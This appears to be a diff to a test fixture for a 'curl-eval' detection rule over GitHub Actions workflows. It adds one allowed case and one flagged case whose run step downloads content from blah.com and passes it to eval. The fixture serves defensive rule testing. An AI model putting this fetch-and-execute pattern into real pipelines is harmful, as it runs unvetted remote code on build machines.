@@ -23,3 +23,10 @@ jobs:
         run: |
           CONTENTS=$(curl https://blah.com)
           eval $CONTENTS
+      - name: GitHub expression and no download
+        # ok: curl-eval
+        run: |
+          echo "::add-matcher::${{ runner.tool_cache }}/phpunit.json"
+      - name: double-quoted scalar with an escaped line break
+        # ruleid: curl-eval
+        run: "CONTENTS=$(curl https://blah.com)\neval $CONTENTS"
